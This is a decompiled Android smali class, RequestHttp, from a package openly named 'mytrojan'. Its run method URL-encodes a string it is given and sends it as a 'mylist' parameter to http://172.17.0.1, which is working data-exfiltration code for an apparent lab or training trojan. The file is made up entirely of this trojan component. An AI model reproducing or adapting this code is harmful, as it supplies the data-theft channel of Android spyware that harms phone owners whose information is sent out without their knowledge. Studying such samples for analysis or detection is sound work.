.class public Lcom/example/mytrojan/RequestHttp;
.super Ljava/lang/Object;
.source "RequestHttp.java"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field private content:Ljava/lang/String;


# direct methods
.method public constructor <init>(Ljava/lang/String;)V
    .registers 2
    .param p1, "content"    # Ljava/lang/String;

    .prologue
    .line 12
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 13
    iput-object p1, p0, Lcom/example/mytrojan/RequestHttp;->content:Ljava/lang/String;

    .line 14
    return-void
.end method


# virtual methods
.method public run()V
    .registers 10

    .prologue
    .line 19
    :try_start_0
    iget-object v7, p0, Lcom/example/mytrojan/RequestHttp;->content:Ljava/lang/String;

    const-string v8, "utf-8"

    invoke-static {v7, v8}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 20
    .local v1, "encoded_content":Ljava/lang/String;
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "http://172.17.0.1?mylist="

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 21
    .local v4, "req":Ljava/lang/String;
    new-instance v5, Ljava/net/URL;

    invoke-direct {v5, v4}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 22
    .local v5, "url":Ljava/net/URL;
    invoke-virtual {v5}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v6

    check-cast v6, Ljava/net/HttpURLConnection;

    .line 23
    .local v6, "urlConnection":Ljava/net/HttpURLConnection;
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    .line 25
    invoke-virtual {v6}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_2c
    .catch Ljava/net/MalformedURLException; {:try_start_0 .. :try_end_2c} :catch_2d
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_2c} :catch_32
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_2c} :catch_37

    .line 36
    .end local v1    # "encoded_content":Ljava/lang/String;
    .end local v4    # "req":Ljava/lang/String;
    .end local v5    # "url":Ljava/net/URL;
    .end local v6    # "urlConnection":Ljava/net/HttpURLConnection;
    :goto_2c
    return-void

    .line 27
    :catch_2d
    move-exception v0

    .line 28
    .local v0, "e":Ljava/net/MalformedURLException;
    invoke-virtual {v0}, Ljava/net/MalformedURLException;->printStackTrace()V

    goto :goto_2c

    .line 30
    .end local v0    # "e":Ljava/net/MalformedURLException;
    :catch_32
    move-exception v3

    .line 31
    .local v3, "io":Ljava/io/IOException;
    invoke-virtual {v3}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2c

    .line 33
    .end local v3    # "io":Ljava/io/IOException;
    :catch_37
    move-exception v2

    .line 34
    .local v2, "ge":Ljava/lang/Exception;
    invoke-virtual {v2}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2c
.end method
